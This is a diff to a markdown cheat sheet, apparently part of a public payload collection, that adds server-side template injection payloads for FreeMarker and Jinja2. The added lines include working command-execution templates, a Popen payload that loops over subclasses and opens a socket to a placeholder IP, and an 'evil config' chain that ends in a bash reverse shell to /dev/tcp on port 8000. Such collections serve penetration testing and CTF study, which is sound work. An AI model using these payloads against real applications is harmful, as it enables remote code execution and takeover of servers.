@@ -150,6 +150,7 @@ The template can be `${3*3}` or the legacy `#{3*3}`
 ```js
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
 [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
 ```
 
 ## Jade / Codepen
@@ -187,9 +188,9 @@ ${x}
 ## Jinja2
 
 [Official website](http://jinja.pocoo.org/)
-> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.
+> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  
 
-### Basic injection
+### Basic injection
 
 ```python
 {{4*4}}[[5*5]]
@@ -253,13 +254,32 @@ Listen for connexion
 nv -lnvp 8000
 ```
 
-Inject this template
+#### Exploit the SSTI by calling subprocess.Popen.
+:warning: the number 396 will vary depending of the application.
 
 ```python
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} # evil config
-{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  # load the evil config
-{{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} # connect to evil host
+{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
 ```
+
+#### Exploit the SSTI by calling Popen without guessing the offset
+
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+```
+
+#### Exploit the SSTI by writing an evil config file.
+
+```python
+# evil config
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 
+
+# load the evil config
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  
+
+# connect to evil host
+{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }} 
+```
+
 
 ### Filter bypass
 
